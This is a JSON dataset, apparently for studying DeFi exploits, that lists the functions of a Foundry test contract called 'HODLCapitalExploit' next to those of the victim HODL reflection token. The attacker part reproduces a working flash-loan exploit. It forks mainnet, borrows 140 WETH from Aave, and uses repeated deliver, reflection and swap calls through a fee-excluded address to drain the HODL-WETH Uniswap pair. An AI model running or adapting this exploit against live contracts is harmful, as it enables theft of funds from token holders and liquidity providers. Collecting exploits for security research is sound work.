[
  {
    "contract/interface": "HODLCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "HODLCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "HODLCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "HODLCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "HODLCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address, /*asset*/\n        uint256, /*amount*/\n        uint256, /*premium*/\n        address, /*initator*/\n        bytes calldata /*params*/\n    ) external payable returns (bool) {\n        times = 2;\n        (uint256 reserve0, uint256 reserve1,) = hodl_weth.getReserves();\n        emit log_named_uint(\"Reserve0\", reserve0);\n        emit log_named_uint(\"Reserve1\", reserve1);\n        // uint256 amountIn = getAmountIn(amount1000 / 100000 * 10001, 13387083970661484684, 999631170221975669182);\n        uint256 amountIn = getAmountIn(amount1000 / 100_000 * 10_001, reserve0, reserve1);\n        weth.transfer(address(hodl_weth), amountIn);\n        hodl_weth.swap(0, amount1000 / 100_000 * 10_001, address(this), new bytes(0));\n        hodl.transfer(excludedFromFeeAddress, 1);\n        rTotal = hodl.reflectionFromToken(amount1000, false);\n        uint256 attackerBalance = hodl.balanceOf(address(this));\n        uint256 attackerROwned = hodl.reflectionFromToken(attackerBalance, false);\n        rOwned = attackerROwned;\n        func1c44(10, 1031);\n\n        attackerBalance = hodl.balanceOf(address(this));\n        attackerROwned = hodl.reflectionFromToken(attackerBalance, false);\n        rOwned = attackerROwned;\n        func1c44(10, 1032);\n\n        attackerBalance = hodl.balanceOf(address(this));\n        attackerROwned = hodl.reflectionFromToken(attackerBalance, false);\n        rOwned = attackerROwned;\n        func1c44(10, 1032);\n\n        attackerBalance = hodl.balanceOf(address(this));\n        attackerROwned = hodl.reflectionFromToken(attackerBalance, false);\n        rOwned = attackerROwned;\n        func1c44(10, 1033);\n\n        attackerBalance = hodl.balanceOf(address(this));\n        attackerROwned = hodl.reflectionFromToken(attackerBalance, false);\n        rOwned = attackerROwned;\n        func1c44(10, 1076);\n\n        func1c44(10, 1053);\n        func1c44(5, 1024);\n        func1eae(10_000);\n\n        rTotal = hodl.reflectionFromToken(amount1000, false);\n        func1c44(10, 1098);\n        func1c44(10, 1084);\n        func1c44(10, 1069);\n        func1c44(10, 1052);\n        func1c44(10, 1032);\n        func1eae(5000);\n\n        rTotal = hodl.reflectionFromToken(amount1000, false);\n        func1c44(10, 1052);\n        func1c44(10, 1040);\n        func1c44(10, 1026);\n        func1c44(3, 1010);\n        func1eae(200);\n\n        rTotal = hodl.reflectionFromToken(amount1000, false);\n        func1c44(2, 1007);\n\n        (reserve0, reserve1,) = hodl_weth.getReserves();\n        amountIn = getAmountIn(reserve1 * 9000 / 10_000, reserve0, reserve1);\n        weth.transfer(address(hodl_weth), amountIn);\n        hodl_weth.swap(0, reserve1 * 9000 / 10_000, excludedFromFeeAddress, new bytes(0));\n\n        for (uint256 i = 0; i < 15; i++) {\n            func2574(900);\n        }\n\n        hodl.approve(address(this), type(uint256).max);\n        hodl.transferFrom(address(this), excludedFromFeeAddress, 1);\n        for (uint256 i = 0; i < 15; i++) {\n            func2574(900);\n        }\n\n        hodl.transferFrom(address(this), excludedFromFeeAddress, 1);\n        for (uint256 i = 0; i < 15; i++) {\n            func2574(900);\n        }\n\n        hodl.transferFrom(address(this), excludedFromFeeAddress, 1);\n        for (uint256 i = 0; i < 8; i++) {\n            func2574(900);\n        }\n\n        func2574(700);\n        func2574(80);\n        func26cd(900);\n        func26cd(100);\n        func26cd(42);\n\n        uint256 pairBalance = hodl.balanceOf(address(hodl_weth));\n        (reserve0, reserve1,) = hodl_weth.getReserves();\n        uint256 amountOut = getAmountOut(pairBalance - reserve1, reserve1, reserve0);\n        hodl_weth.swap(amountOut, 0, address(this), new bytes(0));\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "HODLCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "HODLCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\");\n\n        cheats.label(address(aavePool), \"AavePoolV3\");\n        cheats.label(address(hodl_weth), \"HODL-WETH UniswapPair\");\n        cheats.label(address(hodl), \"HODL\");\n        cheats.label(address(weth), \"WETH\");\n        cheats.label(address(router), \"UniswapV2Router\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "HODLCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "HODLCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "HODLCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "HODLCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "HODLCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "HODLCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "HODLCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        cheats.rollFork(17_220_892);\n        emit log_named_decimal_uint(\"Attacker ETH balance before exploit\", weth.balanceOf(address(this)), 18);\n        // console.log(\"excludedFromFee:\", hodl.isExcludedFromFee(excludedFromFeeAddress));\n        // console.log(\"excluded:\", hodl.isExcluded(excludedFromFeeAddress));\n\n        weth.approve(address(aavePool), type(uint256).max);\n        aavePool.flashLoanSimple(address(this), address(weth), 140 ether, new bytes(1), 0);\n        emit log_named_decimal_uint(\"Attacker ETH balance after exploit\", weth.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "HODLCapitalExploit",
    "source_type": "attacker_contract",
    "function_name": "uniswapV2Call",
    "original_code": "    function uniswapV2Call(\n        address, /*sender*/\n        uint256, /*amount0*/\n        uint256, /*amount1*/\n        bytes calldata /*data*/\n    ) external {\n        if (times > 5) {\n            if (times <= 25) {\n                uint256 pairBalance = hodl.balanceOf(address(hodl_weth));\n                (, uint256 reserve1,) = hodl_weth.getReserves();\n                hodl.deliver((reserve1 - pairBalance) * slot8 / 1000);\n                times += 1;\n            }\n",
    "description": ""
  },
  {
    "contract/interface": "IHODL",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "  function allowance(address owner, address spender)\n    external\n    view\n    returns (uint256);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IHODL",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IHODL",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "  function balanceOf(address account) public view override returns (uint256) {\n    if (_isExcluded[account]) return _tOwned[account];\n    return tokenFromReflection(_rOwned[account]);\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IHODL",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "  function decimals() public view returns (uint8) {\n    return _decimals;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IHODL",
    "source_type": "victim_contract",
    "function_name": "deliver",
    "original_code": "  function deliver(uint256 tAmount) public {\n    address sender = _msgSender();\n    require(\n      !_isExcluded[sender],\n",
    "description": ""
  },
  {
    "contract/interface": "IHODL",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IHODL",
    "source_type": "victim_contract",
    "function_name": "isExcluded",
    "original_code": "  function isExcluded(address account) public view returns (bool) {\n    return _isExcluded[account];\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IHODL",
    "source_type": "victim_contract",
    "function_name": "isExcludedFromFee",
    "original_code": "  function isExcludedFromFee(address account) public view returns (bool) {\n    return _isExcludedFromFee[account];\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IHODL",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "  function name() public view returns (string memory) {\n    return _name;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IHODL",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "  function owner() public view returns (address) {\n    return _owner;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IHODL",
    "source_type": "victim_contract",
    "function_name": "reflectionFromToken",
    "original_code": "  function reflectionFromToken(uint256 tAmount, bool deductTransferFee)\n    public\n    view\n    returns (uint256)\n  {\n    require(tAmount <= _tTotal, \"Amount must be less than supply\");\n    if (!deductTransferFee) {\n      (uint256 rAmount, , , , , ) = _getValues(tAmount);\n      return rAmount;\n    } else {\n      (, uint256 rTransferAmount, , , , ) = _getValues(tAmount);\n      return rTransferAmount;\n    }\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IHODL",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "  function symbol() public view returns (string memory) {\n    return _symbol;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IHODL",
    "source_type": "victim_contract",
    "function_name": "tokenFromReflection",
    "original_code": "  function tokenFromReflection(uint256 rAmount) public view returns (uint256) {\n    require(rAmount <= _rTotal, \"Amount must be less than total reflections\");\n    uint256 currentRate = _getRate();\n    return rAmount.div(currentRate);\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IHODL",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "  function totalSupply() public view override returns (uint256) {\n    return _tTotal;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IHODL",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address to, uint value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IHODL",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address from, address to, uint value) external returns (bool) {\n        if (allowance[from][msg.sender] != uint(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IHODL",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  }
]